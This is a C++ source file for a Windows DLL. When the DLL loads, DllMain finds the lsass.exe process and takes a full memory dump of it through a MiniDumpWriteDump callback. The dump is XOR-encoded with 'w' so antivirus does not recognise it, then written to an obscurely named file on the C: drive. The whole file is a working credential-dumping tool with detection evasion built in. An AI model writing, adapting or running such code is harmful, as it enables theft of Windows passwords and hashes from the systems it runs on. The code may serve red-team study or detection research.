// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "Dbghelp.h"
#include <tlhelp32.h>
#include <string>
#include <fstream>

using namespace std;

// 100MB buffer for saving the minidump
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 100);
DWORD bytesRead = 0;

BOOL CALLBACK minidumpCallback(__in PVOID callbackParam, __in const PMINIDUMP_CALLBACK_INPUT callbackInput, __inout PMINIDUMP_CALLBACK_OUTPUT callbackOutput)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

		// Gets called for each lsass process memory read operation
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		// A chunk of minidump data that's been jus read from lsass. 
		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
		// We will simply save it to dumpBuffer.
		source = callbackInput->Io.Buffer;

		// Calculate location of where we want to store this part of the dump.
		// Destination is start of our dumpBuffer + the offset of the minidump data
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

void dump()
{
    PROCESSENTRY32 PROCESSENTRY;
    PROCESSENTRY.dwSize = sizeof(PROCESSENTRY32);

	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;

    DWORD pid;
	DWORD bytesWritten;
	HANDLE snapshot;
	HANDLE outFile;
	HANDLE procHandle;

	// find lsass.exe's PID
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &PROCESSENTRY))
    {
        while (L"lsass.exe" != PROCESSENTRY.szExeFile) // assuming lsass.exe will always exist
        {
            Process32Next(snapshot, &PROCESSENTRY);
        }
        pid = PROCESSENTRY.th32ProcessID;
    }

	// minidump lsass.exe
    procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE, FALSE, pid);
    MiniDumpWriteDump(procHandle, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
    
	// XOR minidump with 'w'
	for (DWORD i = 0; i < bytesRead; i++)
    {
        *((char*)dumpBuffer + i) = *((char*)dumpBuffer + i) ^ 'w';
    }

	// write XOR'd minidump to file
	outFile = CreateFile(L"C:\\ks313ddf3a3r1die951a.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL);

    CloseHandle(outFile);
    CloseHandle(procHandle);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            dump();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

